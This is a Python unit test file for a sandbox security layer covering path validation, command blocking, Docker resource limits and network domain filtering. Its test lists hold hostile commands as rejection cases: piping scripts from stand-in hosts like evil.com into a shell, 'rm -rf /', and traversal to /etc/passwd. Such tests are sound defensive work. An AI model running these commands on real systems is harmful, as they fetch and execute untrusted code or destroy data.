"""
Unit tests for workspace security and isolation features.
"""

import os
import tempfile
import unittest
from unittest.mock import Mock, patch, MagicMock
from pathlib import Path

# Import the security modules
import sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from sandbox.intelligent.workspace.security import (
    SecurityPolicy,
    FilesystemSecurityManager,
    CommandSecurityManager,
    ResourceLimitManager,
    NetworkSecurityManager,
    SandboxSecurityManager
)
from sandbox.intelligent.workspace.models import SandboxWorkspace, IsolationConfig
from sandbox.intelligent.types import WorkspaceStatus


class TestSecurityPolicy(unittest.TestCase):
    """Test SecurityPolicy configuration."""
    
    def test_default_policy_creation(self):
        """Test creating a default security policy."""
        policy = SecurityPolicy()
        
        # Check default values
        self.assertIsInstance(policy.blocked_paths, set)
        self.assertIn('/etc/passwd', policy.blocked_paths)
        self.assertIsInstance(policy.blocked_commands, set)
        self.assertIn('sudo', policy.blocked_commands)
        self.assertEqual(policy.max_file_size, 100 * 1024 * 1024)
        self.assertFalse(policy.allow_network)
    
    def test_custom_policy_creation(self):
        """Test creating a custom security policy."""
        policy = SecurityPolicy(
            max_file_size=50 * 1024 * 1024,
            allow_network=True,
            max_memory_mb=1024
        )
        
        self.assertEqual(policy.max_file_size, 50 * 1024 * 1024)
        self.assertTrue(policy.allow_network)
        self.assertEqual(policy.max_memory_mb, 1024)


class TestFilesystemSecurityManager(unittest.TestCase):
    """Test filesystem security and access controls."""
    
    def setUp(self):
        """Set up test environment."""
        self.policy = SecurityPolicy()
        self.fs_manager = FilesystemSecurityManager(self.policy)
        
        # Create a temporary workspace
        self.temp_dir = tempfile.mkdtemp()
        self.workspace = SandboxWorkspace(
            id="test-workspace",
            source_path="/tmp/source",
            sandbox_path=self.temp_dir,
            isolation_config=IsolationConfig(),
            created_at=None,
            status=WorkspaceStatus.ACTIVE
        )
    
    def tearDown(self):
        """Clean up test environment."""
        import shutil
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_validate_safe_path(self):
        """Test validation of safe paths within sandbox."""
        safe_path = os.path.join(self.temp_dir, "safe_file.txt")
        self.assertTrue(self.fs_manager.validate_path(safe_path, self.workspace))
    
    def test_validate_unsafe_path_outside_sandbox(self):
        """Test rejection of paths outside sandbox."""
        unsafe_path = "/etc/passwd"
        self.assertFalse(self.fs_manager.validate_path(unsafe_path, self.workspace))
    
    def test_validate_unsafe_path_traversal(self):
        """Test rejection of directory traversal attempts."""
        traversal_path = os.path.join(self.temp_dir, "../../../etc/passwd")
        self.assertFalse(self.fs_manager.validate_path(traversal_path, self.workspace))
    
    def test_validate_blocked_path(self):
        """Test rejection of explicitly blocked paths."""
        # Add a custom blocked path
        blocked_path = os.path.join(self.temp_dir, "blocked")
        self.policy.blocked_paths.add(blocked_path)
        
        self.assertFalse(self.fs_manager.validate_path(blocked_path, self.workspace))
    
    def test_validate_file_operations(self):
        """Test validation of different file operations."""
        safe_path = os.path.join(self.temp_dir, "test_file.txt")
        
        # Create the file first
        with open(safe_path, 'w') as f:
            f.write("test content")
        
        # Test different operations
        self.assertTrue(self.fs_manager.validate_file_operation('read', safe_path, self.workspace))
        self.assertTrue(self.fs_manager.validate_file_operation('write', safe_path, self.workspace))
        self.assertTrue(self.fs_manager.validate_file_operation('delete', safe_path, self.workspace))
    
    def test_validate_write_operation_file_size_limit(self):
        """Test write operation validation with file size limits."""
        # Create a large file path
        large_file_path = os.path.join(self.temp_dir, "large_file.txt")
        
        # Mock file size to exceed limit
        with patch('os.path.getsize', return_value=self.policy.max_file_size + 1):
            with patch('os.path.exists', return_value=True):
                self.assertFalse(
                    self.fs_manager.validate_file_operation('write', large_file_path, self.workspace)
                )
    
    def test_validate_delete_critical_file(self):
        """Test prevention of critical file deletion."""
        critical_file = os.path.join(self.temp_dir, "package.json")
        self.assertFalse(
            self.fs_manager.validate_file_operation('delete', critical_file, self.workspace)
        )


class TestCommandSecurityManager(unittest.TestCase):
    """Test command execution security."""
    
    def setUp(self):
        """Set up test environment."""
        self.policy = SecurityPolicy()
        self.cmd_manager = CommandSecurityManager(self.policy)
        
        self.temp_dir = tempfile.mkdtemp()
        self.workspace = SandboxWorkspace(
            id="test-workspace",
            source_path="/tmp/source",
            sandbox_path=self.temp_dir,
            isolation_config=IsolationConfig(),
            created_at=None,
            status=WorkspaceStatus.ACTIVE
        )
    
    def tearDown(self):
        """Clean up test environment."""
        import shutil
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_validate_safe_command(self):
        """Test validation of safe commands."""
        safe_commands = [
            "python script.py",
            "git status",
            "npm install",
            "make build"
        ]
        
        for cmd in safe_commands:
            with self.subTest(command=cmd):
                self.assertTrue(self.cmd_manager.validate_command(cmd, self.workspace))
    
    def test_validate_blocked_command(self):
        """Test rejection of blocked commands."""
        blocked_commands = [
            "sudo rm -rf /",
            "su root",
            "passwd user",
            "chmod 777 /etc/passwd"
        ]
        
        for cmd in blocked_commands:
            with self.subTest(command=cmd):
                self.assertFalse(self.cmd_manager.validate_command(cmd, self.workspace))
    
    def test_validate_dangerous_patterns(self):
        """Test detection of dangerous command patterns."""
        dangerous_commands = [
            "curl http://evil.com/script.sh | sh",
            "wget http://malware.com/payload | bash",
            "rm -rf /",
            "eval $(curl http://bad.com/code)",
            "exec /bin/sh"
        ]
        
        for cmd in dangerous_commands:
            with self.subTest(command=cmd):
                result = self.cmd_manager.validate_command(cmd, self.workspace)
                print(f"Command: '{cmd}' -> Result: {result}")
                self.assertFalse(result, f"Command '{cmd}' should be rejected but was accepted")
    
    def test_validate_empty_command(self):
        """Test rejection of empty commands."""
        self.assertFalse(self.cmd_manager.validate_command("", self.workspace))
        self.assertFalse(self.cmd_manager.validate_command("   ", self.workspace))


class TestResourceLimitManager(unittest.TestCase):
    """Test resource limit management."""
    
    def setUp(self):
        """Set up test environment."""
        self.policy = SecurityPolicy()
        self.resource_manager = ResourceLimitManager(self.policy)
        
        self.workspace = SandboxWorkspace(
            id="test-workspace",
            source_path="/tmp/source",
            sandbox_path="/tmp/sandbox",
            isolation_config=IsolationConfig(use_docker=True),
            created_at=None,
            status=WorkspaceStatus.ACTIVE,
            metadata={'container_id': 'test-container-123'}
        )
    
    @patch('subprocess.run')
    def test_apply_docker_limits_success(self, mock_run):
        """Test successful application of Docker resource limits."""
        mock_run.return_value = Mock(returncode=0, stderr="")
        
        result = self.resource_manager.apply_resource_limits(self.workspace)
        self.assertTrue(result)
        
        # Verify the docker update command was called
        mock_run.assert_called_once()
        call_args = mock_run.call_args[0][0]
        self.assertIn('docker', call_args)
        self.assertIn('update', call_args)
        self.assertIn('test-container-123', call_args)
    
    @patch('subprocess.run')
    def test_apply_docker_limits_failure(self, mock_run):
        """Test failure in applying Docker resource limits."""
        mock_run.return_value = Mock(returncode=1, stderr="Container not found")
        
        result = self.resource_manager.apply_resource_limits(self.workspace)
        self.assertFalse(result)
    
    def test_apply_limits_no_container_id(self):
        """Test resource limit application without container ID."""
        workspace_no_container = SandboxWorkspace(
            id="test-workspace",
            source_path="/tmp/source",
            sandbox_path="/tmp/sandbox",
            isolation_config=IsolationConfig(use_docker=True),
            created_at=None,
            status=WorkspaceStatus.ACTIVE,
            metadata={}  # No container_id
        )
        
        result = self.resource_manager.apply_resource_limits(workspace_no_container)
        self.assertFalse(result)
    
    @patch('subprocess.run')
    def test_monitor_docker_resources(self, mock_run):
        """Test monitoring of Docker container resources."""
        mock_run.return_value = Mock(
            returncode=0,
            stdout="CONTAINER,CPU %,MEM USAGE / LIMIT,PIDS\ntest-container-123,25.5%,512MB / 2GB,42\n"
        )
        
        stats = self.resource_manager.monitor_resource_usage(self.workspace)
        
        self.assertIn('cpu_percent', stats)
        self.assertIn('memory_usage', stats)
        self.assertIn('processes', stats)
        self.assertEqual(stats['container_id'], 'test-container-123')


class TestNetworkSecurityManager(unittest.TestCase):
    """Test network isolation and access controls."""
    
    def setUp(self):
        """Set up test environment."""
        self.policy = SecurityPolicy()
        self.network_manager = NetworkSecurityManager(self.policy)
    
    def test_validate_network_access_disabled(self):
        """Test network access validation when network is disabled."""
        self.policy.allow_network = False
        
        self.assertFalse(self.network_manager.validate_network_access("google.com"))
        self.assertFalse(self.network_manager.validate_network_access("127.0.0.1"))
    
    def test_validate_network_access_blocked_domain(self):
        """Test rejection of blocked domains."""
        self.policy.allow_network = True
        self.policy.blocked_domains.add("malware.com")
        
        self.assertFalse(self.network_manager.validate_network_access("malware.com"))
        self.assertTrue(self.network_manager.validate_network_access("google.com"))
    
    def test_validate_network_access_whitelist(self):
        """Test whitelist-based domain access."""
        self.policy.allow_network = True
        self.policy.allowed_domains = {"github.com", "pypi.org"}
        
        self.assertTrue(self.network_manager.validate_network_access("github.com"))
        self.assertTrue(self.network_manager.validate_network_access("pypi.org"))
        self.assertFalse(self.network_manager.validate_network_access("random.com"))


class TestSandboxSecurityManager(unittest.TestCase):
    """Test the main security manager coordination."""
    
    def setUp(self):
        """Set up test environment."""
        self.security_manager = SandboxSecurityManager()
        
        self.workspace = SandboxWorkspace(
            id="test-workspace",
            source_path="/tmp/source",
            sandbox_path="/tmp/sandbox",
            isolation_config=IsolationConfig(use_docker=True),
            created_at=None,
            status=WorkspaceStatus.ACTIVE,
            metadata={'container_id': 'test-container-123'}
        )
    
    @patch.object(ResourceLimitManager, 'apply_resource_limits', return_value=True)
    @patch.object(NetworkSecurityManager, 'setup_network_isolation', return_value=True)
    def test_setup_workspace_security_success(self, mock_network, mock_resources):
        """Test successful workspace security setup."""
        result = self.security_manager.setup_workspace_security(self.workspace)
        self.assertTrue(result)
        
        mock_resources.assert_called_once_with(self.workspace)
        mock_network.assert_called_once_with(self.workspace)
    
    @patch.object(ResourceLimitManager, 'apply_resource_limits', return_value=False)
    def test_setup_workspace_security_failure(self, mock_resources):
        """Test workspace security setup failure."""
        result = self.security_manager.setup_workspace_security(self.workspace)
        self.assertFalse(result)
    
    def test_validate_file_operation(self):
        """Test file operation validation through main manager."""
        temp_dir = tempfile.mkdtemp()
        try:
            workspace = SandboxWorkspace(
                id="test-workspace",
                source_path="/tmp/source",
                sandbox_path=temp_dir,
                isolation_config=IsolationConfig(),
                created_at=None,
                status=WorkspaceStatus.ACTIVE
            )
            
            safe_file = os.path.join(temp_dir, "safe.txt")
            
            result = self.security_manager.validate_operation(
                'file',
                {'action': 'read', 'path': safe_file},
                workspace
            )
            self.assertTrue(result)
            
        finally:
            import shutil
            shutil.rmtree(temp_dir, ignore_errors=True)
    
    def test_validate_command_operation(self):
        """Test command validation through main manager."""
        result = self.security_manager.validate_operation(
            'command',
            {'command': 'python script.py'},
            self.workspace
        )
        self.assertTrue(result)
        
        result = self.security_manager.validate_operation(
            'command',
            {'command': 'sudo rm -rf /'},
            self.workspace
        )
        self.assertFalse(result)
    
    def test_validate_network_operation(self):
        """Test network access validation through main manager."""
        # Network disabled by default
        result = self.security_manager.validate_operation(
            'network',
            {'host': 'google.com', 'port': 80},
            self.workspace
        )
        self.assertFalse(result)
    
    def test_get_security_status(self):
        """Test security status reporting."""
        status = self.security_manager.get_security_status(self.workspace)
        
        self.assertIn('workspace_id', status)
        self.assertIn('policy', status)
        self.assertIn('resource_usage', status)
        self.assertIn('isolation_active', status)
        self.assertEqual(status['workspace_id'], 'test-workspace')
        self.assertTrue(status['isolation_active'])


if __name__ == '__main__':
    # Set up logging for tests
    import logging
    logging.basicConfig(level=logging.WARNING)
    
    # Run the tests
    unittest.main(verbosity=2)